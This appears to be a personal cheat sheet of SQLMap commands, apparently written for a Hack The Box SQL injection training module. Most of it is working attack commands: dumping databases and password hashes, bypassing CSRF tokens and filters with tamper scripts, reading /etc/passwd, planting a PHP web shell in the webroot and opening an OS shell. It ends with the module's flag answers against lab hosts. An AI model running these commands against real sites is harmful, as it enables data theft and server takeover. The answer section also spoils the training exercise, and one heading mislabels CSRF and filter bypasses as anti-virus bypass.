### Content 
* [Database Enumeration](#database-enumeration)
	* [Privileges enumeration](#privileges-enumeration)
	* [Full DB enumeration](#full-db-enumeration)
	* [Table enumeration](#table-enumeration)
	* [Searching for data](#searching-for-data)
	* [Password Enumeration and Cracking](#password-enumeration-and-cracking) 
* [Anti-Virus bypass techniques](#anti-virus-bypass-techniques)
* [OS Exploitation](#os-exploitation)
	* [File Read/Write](#file-read/write)
	* [OS Command Execution](#os-command-execution)
* [HTB module answers](#htb-module-answers)
---
## Database Enumeration
#### Privileges enumeration
``` bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```
#### Full DB enumeration
``` bash
# Retrieve all tables inside the database
sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs -D testdb
# DB schema enumeration (retrieve the structure of all of the tables)
sqlmap -u "http://www.example.com/?id=1" --schema
```
#### Table enumeration
``` bash
# Retrieve tabele names from testdb database
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
# Retrieve table content
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
# Retrieve specific columns from the table
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
# Specify how many entries will be dumped from the table
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
# Conditional Enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
#### Searching for data
``` bash
# Search for a table that has user on its name
sqlmap -u "http://www.example.com/?id=1" --search -T user
# Search for a column that has pass on its name
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```
#### Password Enumeration and Cracking
* Crack passwords inside a specific table

 `sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users`
* DB Users Password Enumeration and Cracking

`sqlmap -u "http://www.example.com/?id=1" --passwords --batch`

---
## Anti-Virus bypass techniques
* Anti-CSRF Token Bypass
```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-t0ken=token" --csrf-token="csrf-t0ken"
```
* Unique Value Bypass
```shell
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch
```
* Calculated Parameter Bypass
```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```
#### Tamper Scripts  
example:
```bash
sqlmap -r req.txt --batch --tamper=between,randomcase -T flag11 --dump
```

| **Tamper-Script**           | **Description**                                                                                                                  |
| --------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `0eunion`                   | Replaces instances of UNION with e0UNION                                                                                         |
| `base64encode`              | Base64-encodes all characters in a given payload                                                                                 |
| `between`                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                 |
| `commalesslimit`            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                 |
| `equaltolike`               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                         |
| `halfversionedmorekeywords` | Adds (MySQL) versioned comment before each keyword                                                                               |
| `modsecurityversioned`      | Embraces complete query with (MySQL) versioned comment                                                                           |
| `modsecurityzeroversioned`  | Embraces complete query with (MySQL) zero-versioned comment                                                                      |
| `percentage`                | Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                            |
| `plus2concat`               | Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart                                                          |
| `randomcase`                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                                   |
| `space2comment`             | Replaces space character ( ) with comments `/                                                                                    |
| `space2dash`                | Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| `space2hash`                | Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| `space2mssqlblank`          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters         |
| `space2plus`                | Replaces space character ( ) with plus (`+`)                                                                                     |
| `space2randomblank`         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                              |
| `symboliclogical`           | Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)                                           |
| `versionedkeywords`         | Encloses each non-function keyword with (MySQL) versioned comment                                                                |
| `versionedmorekeywords`     | Encloses each keyword with (MySQL) versioned comment                                                                             |
| `--list-tampers`            | To see all tamper scripts use                                                                                                    |

---
## OS Exploitation
### File Read/Write
example:
``` mysql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
```
* Checking for DBA Privileges
``` bash 
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```
* Reading Local Files
	* in `MySql`, to read local files, the DB user must have the privilege to `LOAD DATA` and `INSERT`, to be able to load the content of a file to a table and then reading that table.
``` bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```
* Writing Local Files
``` bash
# If the server side is using PHP
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Write this file on the remote server, default server webroot for Apache:
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"

# Access the remote PHP shell, and execute a sample command:
curl http://www.example.com/shell.php?cmd=ls+-la
```
### OS Command Execution
To get an OS shell with SQLMap, we can use the `--os-shell` option, as follows:
``` bash
sqlmap -u "http://www.example.com/?id=1" --os-shell

# If there is no output from our command, try to specify another technique that has a better chance of giving us direct output
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```
---
## HTB module answers
* flag2
``` bash
sqlmap -r req.txt --batch --dump
```
* flag3
``` bash
sqlmap -u http://159.65.95.114:31469/case3.php --cookie='id=1*' --dump --batch
```
*  flag4
``` bash
sqlmap -r req.txt
```
* flag5
``` bash
sqlmap -u http://159.65.95.114:32275/case5.php?id=1 --risk=3 --level=5 -T flag5 --no-cast --batch --dump
```
* flag6
```bash
sqlmap http://159.65.95.114:31761/case6.php?col=id --random-agent --batch --dump --prefix="')" --level=5 --risk=3
```
* flag7
```bash
sqlmap -r req.txt --union-cols=5 --dump
```
* What's the name of the column containing "style" in it's name? (Case #1)
```bash
sqlmap http://94.237.63.130:55858/case1.php?id=1 --search -C style
```
* What's the Kimberly user's password? (Case #1)
``` bash
sqlmap http://94.237.63.130:55858/case1.php?id=1 --dump -D testdb -T users --batch
```
* flag8
```bash
sqlmap -r req.txt --csrf-token=t0ken -T flag8 --batch --dump
```
* flag9
```bash
sqlmap -r req.txt --randomize=uid -T flag9 --batch --dump
```
* flag10
```bash
sqlmap -r req.txt  -T flag10 --batch --dump
```
*  flag11
```bash
sqlmap -r req.txt --batch --tamper=between,randomcase -T flag11 --dump
```
* Try to use SQLMap to read the file "/var/www/html/flag.txt".
``` bash
sqlmap http://94.237.62.166:58313/?id=1 --is-dba -batch --file-read "/var/www/html/flag.txt"
```
* Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.
``` bash
sqlmap -u http://94.237.62.166:40727/?id=1 --batch --os-shell
```
* final_flag
	1. Locate the attack vector manually (got to shop.html)
	2. Hover over a product and click on add to cart
	3. Intercept the post request and work with it
``` bash
sqlmap -r req.txt --batch -T final_flag --dump --tamper=between,randomcase
```

``` HTTP
POST /action.php HTTP/1.1
Host: 94.237.60.32:37445
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.60.32:37445/shop.html
Content-Type: application/json
Content-Length: 8
Origin: http://94.237.60.32:37445
DNT: 1
Connection: close
Sec-GPC: 1

{"id":1}
```
---